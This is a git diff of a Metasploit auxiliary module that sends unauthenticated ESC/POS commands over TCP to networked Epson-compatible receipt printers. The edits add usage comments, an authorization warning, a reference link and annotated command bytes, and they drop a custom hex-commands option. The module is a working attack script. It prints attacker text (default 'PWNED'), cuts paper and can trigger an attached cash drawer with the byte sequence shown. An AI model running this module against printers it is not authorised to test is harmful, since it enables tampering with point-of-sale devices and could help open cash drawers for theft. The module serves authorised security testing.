@@ -1,4 +1,17 @@
 # encoding: utf-8
+#
+# Escpos TCP Command Injector for networked Epson-compatible printers
+#
+# This module exploits an unauthenticated ESC/POS command vulnerability in networked receipt printers.
+#
+# Example usage:
+#   use auxiliary/scanner/printer/escpos_tcp_command_injector
+#   set RHOST 192.168.1.100
+#   set MESSAGE "Test"
+#   run
+#
+# WARNING: Only use this module on printers you are authorized to test.
+#
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
@@ -13,7 +26,10 @@ class MetasploitModule < Msf::Auxiliary
         You can also optionally trigger the cash drawer.
       },
       'Author'      => ['FutileSkills'],
-      'License'     => MSF_LICENSE
+      'License'     => MSF_LICENSE,
+      'References'  => [
+        ['URL', 'https://github.com/futileskills/Security-Advisory']
+      ]
     ))
 
     register_options(
@@ -21,38 +37,30 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RHOST(),                                      # Target IP
         Opt::RPORT(9100),                                  # Default printer port
         OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']),
-        OptString.new('HEX_COMMANDS', [false, 'Custom hex commands to send before printing']),
         OptBool.new('RUN_EXPLOIT', [true, 'Whether to actually send commands to the printer', true]),
         OptBool.new('TRIGGER_DRAWER', [false, 'Whether to trigger the attached cash drawer', false])
       ]
     )
   end
 
-  # Cash drawer command
+  # ESC/POS command to trigger the cash drawer
   DRAWER_COMMAND = "\x1b\x70\x00\x19\x32"
 
   def run
     rhost_ip = rhost
     message = datastore['MESSAGE']
-    hex_commands = datastore['HEX_COMMANDS']
     run_exploit = datastore['RUN_EXPLOIT']
     trigger_drawer = datastore['TRIGGER_DRAWER']
 
     if run_exploit
-      # Send custom hex commands before default sequence
-      if hex_commands && !hex_commands.empty?
-        begin
-          custom_bytes = [hex_commands.gsub(/\\x([0-9A-Fa-f]{2})/, '\1')].pack('H*')
-          connect
-          sock.put(custom_bytes)
-          disconnect
-          print_status("Sent custom HEX_COMMANDS to #{rhost_ip}")
-        rescue => e
-          print_error("Failed to send HEX_COMMANDS: #{e}")
-        end
-      end
-
       # ESC/POS print commands: initialize, center, double-size font for message, reset alignment, cut
+      # "\x1b\x40"      => Initialize printer
+      # "\x1b\x61\x01"  => Center alignment
+      # "\x1d\x21\x11"  => Double-size font
+      # "#{message}"    => User-provided message
+      # "\x1d\x21\x00"  => Reset font
+      # "\n\x1b\x61\x00\n\n" => Left alignment and extra newlines
+      # "\x1d\x56\x42"  => Cut paper
       print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"
 
       begin
